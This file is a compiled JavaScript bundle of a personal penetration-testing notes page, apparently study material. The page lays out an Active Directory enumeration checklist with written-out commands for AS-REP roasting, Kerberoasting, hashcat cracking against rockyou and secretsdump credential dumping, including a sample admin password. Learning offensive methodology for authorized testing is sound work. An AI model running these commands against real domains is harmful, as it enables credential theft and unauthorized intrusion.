"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[340],{4631:(e,r,s)=>{s.r(r),s.d(r,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>t,metadata:()=>n,toc:()=>l});const n=JSON.parse('{"id":"procedure/Procedure","title":"Procedure","description":"Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert or smth!","source":"@site/docs/procedure/Procedure.md","sourceDirName":"procedure","slug":"/procedure/","permalink":"/portfolio/docs/procedure/","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1764594628000,"sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"docsSidebar","previous":{"title":"Procedure","permalink":"/portfolio/docs/category/procedure"},"next":{"title":"NTLM","permalink":"/portfolio/docs/procedure/NTLM"}}');var o=s(4848),i=s(8453);const t={sidebar_position:1},c=void 0,d={},l=[{value:"1. Run begin.sh (basically autorecon)",id:"1-run-beginsh-basically-autorecon",level:2},{value:"2. After nmap full port scan is done",id:"2-after-nmap-full-port-scan-is-done",level:2},{value:"3. After everything is done",id:"3-after-everything-is-done",level:2}];function a(e){const r={a:"a",code:"code",h2:"h2",li:"li",p:"p",ul:"ul",...(0,i.R)(),...e.components},{Details:s}=r;return s||function(e,r){throw new Error("Expected "+(r?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(r.p,{children:"Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert or smth!"}),"\n",(0,o.jsx)(r.h2,{id:"1-run-beginsh-basically-autorecon",children:"1. Run begin.sh (basically autorecon)"}),"\n",(0,o.jsxs)(s,{children:[(0,o.jsxs)(r.p,{children:["While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Do ",(0,o.jsx)("a",{href:"./general/Connecting",children:"anonymous login"})," for any main services identified also."]}),(0,o.jsx)(r.p,{children:"If AD detected:"}),(0,o.jsxs)(s,{children:[(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Run dnsrecon"}),"\n"]}),(0,o.jsx)(s,{children:(0,o.jsxs)(r.p,{children:[(0,o.jsx)(r.code,{children:"dnsrecon -d <a machine> -r <subnet range /8>"})," (eg ",(0,o.jsx)(r.code,{children:"dnsrecon -d 10.10.10.100 -r 10.0.0.0/8"}),")"]})}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Check for AS-REP roasting"}),"\n"]}),(0,o.jsx)(s,{children:(0,o.jsxs)(r.p,{children:["Run ",(0,o.jsx)(r.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>"})," (eg ",(0,o.jsx)(r.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>"}),"). Then run ",(0,o.jsx)(r.code,{children:'hashcat --help | grep -i "Kerberos"'})," and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run ",(0,o.jsx)(r.code,{children:"sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]})}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Check for Kerberoasting (Requires user and plaintext password)"}),"\n"]}),(0,o.jsx)(s,{children:(0,o.jsxs)(r.p,{children:[(0,o.jsx)(r.code,{children:"sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>"})," then ",(0,o.jsx)(r.code,{children:"sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]})}),(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"[Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse (Requires user and plaintext password)"}),"\n"]}),(0,o.jsx)(s,{children:(0,o.jsxs)(r.p,{children:[(0,o.jsx)(r.code,{children:"impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip>"})," (eg ",(0,o.jsx)(r.code,{children:'impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\\!"@192.168.50.70'}),")"]})})]}),(0,o.jsxs)(r.p,{children:["If SMB detected: ",(0,o.jsx)(r.a,{href:"/docs/general/SMB",children:"SMB"})]}),(0,o.jsx)(r.p,{children:"If fetched files from SMB or FTP, run filescanner from cybertools."})]}),"\n",(0,o.jsx)(r.h2,{id:"2-after-nmap-full-port-scan-is-done",children:"2. After nmap full port scan is done"}),"\n",(0,o.jsxs)(s,{children:[(0,o.jsx)(r.p,{children:"List down all ports and prioritise which to look thru first."}),(0,o.jsx)(r.p,{children:"Look thru full nmap scan for any definitive versions and add that to software/versions list."})]}),"\n",(0,o.jsx)(r.h2,{id:"3-after-everything-is-done",children:"3. After everything is done"}),"\n",(0,o.jsx)(s,{children:(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:"Check feroxbuster for HTTP ports"}),"\n",(0,o.jsx)(r.li,{children:"Check patterns for any new identified software or CVEs"}),"\n"]})}),"\n",(0,o.jsx)(r.p,{children:"If found:"}),"\n",(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsxs)(r.li,{children:["NTLM hash: refer to ",(0,o.jsx)(r.a,{href:"/docs/procedure/NTLM",children:"NTLM"})]}),"\n",(0,o.jsx)(r.li,{children:(0,o.jsx)(r.a,{href:"/docs/general/AD#enumeration",children:"AD"})}),"\n",(0,o.jsxs)(r.li,{children:["cpassword hash: in gpp-decrypt in cybertools, ",(0,o.jsx)(r.code,{children:"source venv/bin/activate"})," then ",(0,o.jsx)(r.code,{children:"python3 gpp-decrypt.py -c <hash>"})," or ",(0,o.jsx)(r.code,{children:"python3 gpp-decrypt.py -f <xml file>.xml"})]}),"\n"]}),"\n",(0,o.jsx)(r.p,{children:"Errors:"}),"\n",(0,o.jsxs)(r.ul,{children:["\n",(0,o.jsx)(r.li,{children:(0,o.jsx)(r.a,{href:"https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069",children:"Clock skew too great"})}),"\n"]})]})}function h(e={}){const{wrapper:r}={...(0,i.R)(),...e.components};return r?(0,o.jsx)(r,{...e,children:(0,o.jsx)(a,{...e})}):a(e)}},8453:(e,r,s)=>{s.d(r,{R:()=>t,x:()=>c});var n=s(6540);const o={},i=n.createContext(o);function t(e){const r=n.useContext(i);return n.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:t(e.components),n.createElement(i.Provider,{value:r},e.children)}}}]);